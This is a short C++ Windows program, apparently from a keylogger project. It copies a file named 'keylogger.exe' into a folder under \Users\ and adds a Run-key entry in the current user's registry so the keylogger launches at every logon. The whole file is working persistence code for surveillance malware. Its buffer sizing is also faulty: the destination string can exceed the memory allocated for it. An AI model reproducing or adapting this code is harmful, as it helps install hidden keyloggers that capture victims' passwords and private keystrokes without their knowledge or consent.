#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <tchar.h>

using namespace std;




int main() {
    HKEY hKey;
    LPCTSTR reg = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

    LPCTSTR name = TEXT("keylogger.exe");

    LPCTSTR relative_path = TEXT("keylogger.exe");

    TCHAR absolute_path[MAX_PATH];
    TCHAR drive[_MAX_DRIVE];
    TCHAR dir[_MAX_DIR];

    DWORD pathLength = GetFullPathName(relative_path, MAX_PATH, absolute_path, nullptr);
    absolute_path[pathLength] = '\0';

    cout << "Full Path: " << absolute_path << endl;
    _tsplitpath(absolute_path, drive, dir, nullptr, nullptr);

    size_t rootLength = _tcslen(drive) + _tcslen(dir) + 1;
    TCHAR* root = new TCHAR[rootLength];

    _tcscpy(root, drive);
    _tcscat(root, _T("\\Users\\keylogger.exe"));

    cout << "Root: " << root << endl;

    if (CopyFile(absolute_path, root, FALSE) != 0) {
        cout << "File Copy Success" << endl;
    }
    else {
        cout << "File Copy Failed: " << GetLastError() << endl;
        // Handle the error as needed
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, reg, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD dataSize = static_cast<DWORD>(_tcslen(root) + 1) * sizeof(TCHAR);

        if (RegSetValueEx(hKey, name, 0, REG_SZ, reinterpret_cast<BYTE*>(root), dataSize) == ERROR_SUCCESS) {
            cout << "Registry Entry Success" << endl;
        }
        else {
            cout << "Registry Entry Failed: " << GetLastError() << endl;
            // Handle the error as needed
        }

        RegCloseKey(hKey);
    }
    else {
        cout << "Registry Open Failed: " << GetLastError() << endl;
        // Handle the error as needed
    }

    int test;
    cin >> test;
    delete[] root;
}
